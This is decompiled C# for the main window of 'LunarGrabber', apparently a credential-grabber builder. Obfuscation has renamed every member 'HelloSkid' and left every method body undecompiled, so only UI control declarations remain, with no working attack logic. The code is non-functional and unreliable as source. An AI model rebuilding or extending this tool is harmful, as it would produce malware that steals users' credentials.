﻿// Decompiled with JetBrains decompiler
// Type: LunarGrabber.MainForm
// Assembly: LunarGrabber, Version=2.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 8F156DE2-B4D0-4210-84CA-FF98CDA75F13
// Assembly location: C:\Users\jayde\OneDrive\Desktop\CT-Dev.MT\ZeroStance\Grabbers (Builders)\LunarGrabber_v2\LunarGrabber.exe

using MetroFramework.Components;
using MetroFramework.Controls;
using MetroFramework.Forms;
using Siticone.UI.WinForms;
using System;
using System.ComponentModel;
using System.Drawing;
using System.Windows.Forms;
using Zeroit.Framework.CodeTextBox;

namespace LunarGrabber
{
  public class MainForm : MetroForm
  {
    private bool HelloSkid;
    private Random HelloSkid;
    private IContainer HelloSkid;
    private TabPage HelloSkid;
    private TabPage HelloSkid;
    private MetroTabControl HelloSkid;
    private MetroTabPage HelloSkid;
    private MetroCheckBox HelloSkid;
    private MetroCheckBox HelloSkid;
    private MetroCheckBox HelloSkid;
    private MetroCheckBox HelloSkid;
    private MetroCheckBox HelloSkid;
    private MetroTextBox HelloSkid;
    private MetroTextBox HelloSkid;
    private MetroCheckBox HelloSkid;
    private MetroCheckBox HelloSkid;
    private MetroCheckBox HelloSkid;
    private MetroCheckBox HelloSkid;
    private MetroTabControl HelloSkid;
    private MetroTabPage HelloSkid;
    private MetroTabPage HelloSkid;
    private MetroTabPage HelloSkid;
    private MetroTextBox HelloSkid;
    private MetroStyleManager HelloSkid;
    private MetroCheckBox HelloSkid;
    private PictureBox HelloSkid;
    private PictureBox HelloSkid;
    private MetroCheckBox HelloSkid;
    private MetroTextBox HelloSkid;
    private MetroTextBox HelloSkid;
    private MetroCheckBox HelloSkid;
    private MetroCheckBox HelloSkid;
    private MetroCheckBox HelloSkid;
    private MetroCheckBox HelloSkid;
    private MetroCheckBox HelloSkid;
    private MetroCheckBox HelloSkid;
    private MetroCheckBox HelloSkid;
    private MetroCheckBox HelloSkid;
    private MetroTextBox HelloSkid;
    private MetroPanel HelloSkid;
    private MetroTextBox HelloSkid;
    private MetroLabel HelloSkid;
    private MetroButton HelloSkid;
    private MetroButton HelloSkid;
    private MetroButton HelloSkid;
    private GroupBox HelloSkid;
    private MetroTabPage HelloSkid;
    private MetroLabel HelloSkid;
    private MetroLabel HelloSkid;
    private MetroComboBox HelloSkid;
    private MetroTextBox HelloSkid;
    private MetroTextBox HelloSkid;
    private MetroCheckBox HelloSkid;
    private MetroTextBox HelloSkid;
    private MetroTextBox HelloSkid;
    private MetroCheckBox HelloSkid;
    private MetroToolTip HelloSkid;
    private MetroTabPage HelloSkid;
    private GroupBox HelloSkid;
    private MetroTabPage HelloSkid;
    private ZeroitCodeTextBox HelloSkid;
    private GroupBox HelloSkid;
    private GroupBox HelloSkid;
    private MetroTrackBar HelloSkid;
    private MetroTextBox HelloSkid;
    private MetroButton HelloSkid;
    private MetroLabel HelloSkid;
    private MetroLabel HelloSkid;
    private MetroLabel HelloSkid;
    private SiticoneMetroTrackBar HelloSkid;
    private SiticoneMetroTrackBar HelloSkid;
    private SiticoneMetroTrackBar HelloSkid;
    private MetroTabPage HelloSkid;
    private MetroButton HelloSkid;
    private ListView HelloSkid;
    private ColumnHeader HelloSkid;
    private ColumnHeader HelloSkid;
    private MetroButton HelloSkid;
    private GroupBox HelloSkid;
    private MetroTextBox HelloSkid;
    private MetroCheckBox HelloSkid;

    public MainForm()
    {
      // ISSUE: unable to decompile the method.
    }

    private void HelloSkid(object HelloSkid, EventArgs HelloSkid)
    {
      // ISSUE: unable to decompile the method.
    }

    private string HelloSkid(Color HelloSkid)
    {
      // ISSUE: unable to decompile the method.
    }

    private void HelloSkid(object HelloSkid, EventArgs HelloSkid)
    {
      // ISSUE: unable to decompile the method.
    }

    private string HelloSkid(string HelloSkid)
    {
      // ISSUE: unable to decompile the method.
    }

    private void HelloSkid(string HelloSkid, string HelloSkid)
    {
      // ISSUE: unable to decompile the method.
    }

    public static byte[] HelloSkid(byte[] HelloSkid)
    {
      // ISSUE: unable to decompile the method.
    }

    private string HelloSkid()
    {
      // ISSUE: unable to decompile the method.
    }

    private void HelloSkid(object HelloSkid, EventArgs HelloSkid)
    {
      // ISSUE: unable to decompile the method.
    }

    private void HelloSkid(object HelloSkid, FormClosingEventArgs HelloSkid)
    {
      // ISSUE: unable to decompile the method.
    }

    private void HelloSkid(object HelloSkid, EventArgs HelloSkid)
    {
      // ISSUE: unable to decompile the method.
    }

    private void HelloSkid(object HelloSkid, EventArgs HelloSkid)
    {
      // ISSUE: unable to decompile the method.
    }

    private void HelloSkid(object HelloSkid, EventArgs HelloSkid)
    {
      // ISSUE: unable to decompile the method.
    }

    private void HelloSkid(object HelloSkid, EventArgs HelloSkid)
    {
      // ISSUE: unable to decompile the method.
    }

    private void HelloSkid(object HelloSkid, EventArgs HelloSkid)
    {
      // ISSUE: unable to decompile the method.
    }

    private void HelloSkid(object HelloSkid, EventArgs HelloSkid)
    {
      // ISSUE: unable to decompile the method.
    }

    private void HelloSkid(object HelloSkid, EventArgs HelloSkid)
    {
      // ISSUE: unable to decompile the method.
    }

    private void HelloSkid(object HelloSkid, EventArgs HelloSkid)
    {
      // ISSUE: unable to decompile the method.
    }

    private void HelloSkid(object HelloSkid, EventArgs HelloSkid)
    {
      // ISSUE: unable to decompile the method.
    }

    private void HelloSkid(object HelloSkid, EventArgs HelloSkid)
    {
      // ISSUE: unable to decompile the method.
    }

    private void HelloSkid(object HelloSkid, EventArgs HelloSkid)
    {
      // ISSUE: unable to decompile the method.
    }

    private bool HelloSkid(string HelloSkid)
    {
      // ISSUE: unable to decompile the method.
    }

    private void HelloSkid(object HelloSkid, EventArgs HelloSkid)
    {
      // ISSUE: unable to decompile the method.
    }

    private void HelloSkid(object HelloSkid, EventArgs HelloSkid)
    {
      // ISSUE: unable to decompile the method.
    }

    private void HelloSkid(object HelloSkid, EventArgs HelloSkid)
    {
      // ISSUE: unable to decompile the method.
    }

    private void HelloSkid(object HelloSkid, EventArgs HelloSkid)
    {
      // ISSUE: unable to decompile the method.
    }

    private void HelloSkid(object HelloSkid, EventArgs HelloSkid)
    {
      // ISSUE: unable to decompile the method.
    }

    private void HelloSkid(object HelloSkid, EventArgs HelloSkid)
    {
      // ISSUE: unable to decompile the method.
    }

    protected virtual void Dispose(bool HelloSkid)
    {
      // ISSUE: unable to decompile the method.
    }

    private void HelloSkid()
    {
      // ISSUE: unable to decompile the method.
    }
  }
}
